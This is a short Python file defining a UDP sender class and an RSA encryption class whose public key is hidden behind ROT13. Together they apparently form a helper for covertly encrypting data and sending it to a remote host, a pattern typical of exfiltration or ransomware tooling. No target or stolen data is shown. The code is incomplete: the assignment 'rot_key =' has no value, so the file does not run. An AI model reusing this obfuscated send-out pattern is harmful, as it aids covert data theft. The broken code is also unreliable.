# Author: PiereLucas(Julian Huch)


import os
import sys
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


class Send():

    def __init__(self, ip, port, data):
        self.ip = ip
        self.port = port
        self.data = data

    def send_udp(self):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(self.data.encode(), (self.ip, self.port))
        return True

class Crypter():

    def __init__(self, data):
        self.data = data
        self.key = self.publickey_rot13()
        self.enc_data = self.enc()

    def crypt(self):
        return self.enc_data

    def publickey_rot13(self):

        rot_key =

        def rot13(r_string):
            d = {}
            for c in (65, 97):
                for i in range(26):
                    d[chr(i + c)] = chr((i + 13) % 26 + c)
            return "".join([d.get(c, c) for c in r_string])

        return rot13(rot_key)

    def enc(self):

        key = RSA.importKey(self.key)
        pkcs1 = PKCS1_OAEP.new(key)
        enc_data = pkcs1.encrypt(self.data)
        return enc_data

